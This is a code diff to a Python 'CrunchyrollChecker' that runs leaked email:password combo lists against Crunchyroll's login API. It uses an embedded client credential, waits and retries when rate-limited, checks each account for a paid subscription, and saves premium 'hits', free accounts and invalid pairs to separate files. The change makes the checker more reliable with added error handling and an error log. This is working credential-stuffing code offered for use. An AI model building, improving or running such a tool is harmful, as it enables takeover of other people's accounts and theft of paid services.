@@ -22,8 +22,7 @@ class CrunchyrollChecker:
     def __init__(self, filename):
         self.apiUrl = "https://beta-api.crunchyroll.com/"
         self.headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
         }
         self.auth = "Basic aHJobzlxM2F3dnNrMjJ1LXRzNWE6cHROOURteXRBU2Z6QjZvbXVsSzh6cUxzYTczVE1TY1k="
         self.data = {
@@ -59,7 +58,8 @@ class CrunchyrollChecker:
         headers : dict = None,
         data : dict = None
         ):
-        data = parse.urlencode(data).encode()
+        if data:
+            data = parse.urlencode(data).encode()
         req = request.Request(
             url,
             headers = headers,
@@ -79,6 +79,7 @@ class CrunchyrollChecker:
         data['password'] = self.password
         headers = dict(self.headers)
         headers["authorization"] = self.auth
+        headers["Content-Type"] = "application/x-www-form-urlencoded"
         req = self._makeRequest(
             self.apiUrl + "auth/v1/token",
             headers,
@@ -88,33 +89,32 @@ class CrunchyrollChecker:
             res = request.urlopen(req)
         except error.HTTPError as e:
             if e.code == 401:
-                print(f'{self.email}:{self.password} Wrong!')
+                self._resultSaving('invalid')
+                return
             elif e.code == 429:
                 print("Too many Requests, Let me take a sleep for 10 seconds.")
                 time.sleep(10)
                 self._tryToLogin()
                 return
             else:
-                print(e)
-            self._resultSaving()
+                self._resultSaving(error = f'Error in while trying to login {e}')
         except Exception as e:
-            print(e)
-            self._resultSaving()
+            self._resultSaving(error = f'Error in while trying to login {e}')
         else:
             resData = self._parseResponse(res)
             try:
                 accessToken = resData['access_token']
             except KeyError:
                 print(f'{self.email}:{self.password} Something went wrong!')
+                self._resultSaving(error = f'Acces Token Not found {resData}')
                 print(resData)
-                self._resultSaving()
             else:
                 if accessToken:
                     self._premiumChecker(accessToken)
                 else:
                     print(f'{self.email}:{self.password} Something went wrong!')
                     print(resData)
-                    self._resultSaving()
+                    self._resultSaving(error = f'Acces Token is empty {resData}')
     
     def _filterEmailPass(self, line):
         loginDetail = re.findall(regexEmailPassCombo, line)
@@ -129,25 +129,36 @@ class CrunchyrollChecker:
         self.hitFile = open(f'{resultDir}hit.txt', 'a')
         self.freeFile = open(f'{resultDir}free.txt', 'a')
         self.invalid = open(f'{resultDir}invalid.txt', 'a')
+        self.error = open(f'{resultDir}error.txt', 'a')
 
-    def _resultSaving(self, file = 'invalid'):
-        if file == 'invalid':
-            self.invalid.write(f'{self.email}:{self.password}' + '\n')
-            self.invalid.flush()
+    def _resultSaving(self, file = 'error', error = None):
+        printMsg = f'{self.email}:{self.password}'
+        if file == 'error':
+            fileRefer = self.error
+            printMsg += f' {error}'
+            fileMsg = printMsg + '\n'
+        elif file == 'invalid':
+            fileRefer = self.invalid
+            fileMsg = printMsg + '\n'
+            printMsg += ' Wrong!'
         elif file == 'hit':
-            self.hitFile.write(f'{self.email}:{self.password}' + '\n')
-            self.hitFile.flush()
+            fileRefer = self.hitFile
+            fileMsg = printMsg + '\n'
+            printMsg += ' Hit Found!'
         else:
-            self.freeFile.write(f'{self.email}:{self.password}' + '\n')
-            self.freeFile.flush()
+            fileRefer = self.freeFile
+            fileMsg = printMsg + '\n'
+            printMsg += ' Free Account Found!'
+        print(printMsg)
+        fileRefer.write(fileMsg)
+        fileRefer.flush()
     
     def _premiumChecker(self, accessToken):
-        header = {
-            "authorization" : f"Bearer {accessToken}"
-        }
+        header = dict(self.headers)
+        header["authorization"] = f"Bearer {accessToken}"
         externalID = self._getExternalID(header)
         if externalID:
-            self._premiumChecker(header, externalID)
+            self._subscriptionChecker(header, externalID)
         return
 
     def _getExternalID(self, header):
@@ -155,30 +166,43 @@ class CrunchyrollChecker:
             self.apiUrl + 'accounts/v1/me',
             headers = header
         )
-        res = request.urlopen(req)
-        resData = self._parseResponse(res)
         try:
-            externalID = resData['external_id']
-        except KeyError:
-            print(f'{self.email}:{self.password} Something went wrong! While getting externalID')
-            print(resData)
-            self._resultSaving(file = 'free')
-            return
+            res = request.urlopen(req)
+        except error.HTTPError as e:
+            self._resultSaving(error = f'Error while getting external id {e}')
+        except Exception as e:
+            self._resultSaving(error = f'Error while getting external id {e}')
         else:
-            return externalID
+            resData = self._parseResponse(res)
+            try:
+                externalID = resData['external_id']
+            except KeyError:
+                print(f'{self.email}:{self.password} Something went wrong! While getting externalID')
+                print(resData)
+                self._resultSaving(file = 'free')
+            else:
+                return externalID
+        return
 
     def _subscriptionChecker(self, header, externalID):
         req = self._makeRequest(
             self.apiUrl + f'subs/v1/subscriptions/{externalID}/products',
             headers = header
         )
-        res = request.urlopen(req)
-        resData = self._parseResponse(res)
-        if resData['total']:
-            print(f'{self.email}:{self.password} Hit Found!')
-            self._resultSaving(file = 'hit')
+        try:
+            res = request.urlopen(req)
+        except error.HTTPError as e:
+            if e.code == 404:
+                self._resultSaving(file = 'free')
+            else:
+                self._resultSaving(error = f'Error while checking subscription {e}')
+        except Exception as e:
+            self._resultSaving(error = f'Error while checking subscription {e}')
         else:
-            print(f'{self.email}:{self.password} Free Account Found!')
-            self._resultSaving(file = 'free')
-        print(resData)
+            resData = self._parseResponse(res)
+            if resData['total']:
+                self._resultSaving(file = 'hit')
+            else:
+                self._resultSaving(file = 'free')
+            print(resData)
 
